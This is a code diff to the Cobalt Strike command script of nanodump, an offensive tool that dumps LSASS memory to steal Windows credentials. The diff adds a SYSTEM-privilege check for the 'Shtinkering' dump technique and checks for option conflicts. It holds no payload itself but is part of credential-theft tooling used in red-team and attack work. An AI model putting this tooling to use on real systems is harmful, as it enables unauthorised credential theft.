@@ -224,9 +224,13 @@ alias nanodump {
         }
         else if (@_[$i] eq "--shtinkering" || @_[$i] eq "-sk")
         {
+            $user = beacon_info($1, "user");
+            if ($user ne "SYSTEM *")
+            {
+                berror($1, "You must be SYSTEM to run the Shtinkering technique");
+                return;
+            }
             $use_lsass_shtinkering = 1;
-            $user = beacon_info($1, "user")
-            # TODO: check that user is SYSTEM
         }
         else if (@_[$i] eq "--seclogon-duplicate" || @_[$i] eq "-sd")
         {
@@ -377,7 +381,7 @@ alias nanodump {
         return;
     }
 
-    if($use_seclogon_leak_local && !$write_file)
+    if(!$use_lsass_shtinkering && $use_seclogon_leak_local && !$write_file)
     {
         berror($1, "If --seclogon-leak-local is being used, you need to provide the dump path with --write");
         return;
@@ -410,6 +414,12 @@ alias nanodump {
     if ($use_lsass_shtinkering && $use_valid_sig)
     {
         berror($1, "The options --shtinkering and --valid cannot be used together");
+        return;
+    }
+
+    if ($use_lsass_shtinkering && $write_file)
+    {
+        berror($1, "The options --shtinkering and --write cannot be used together");
         return;
     }
 
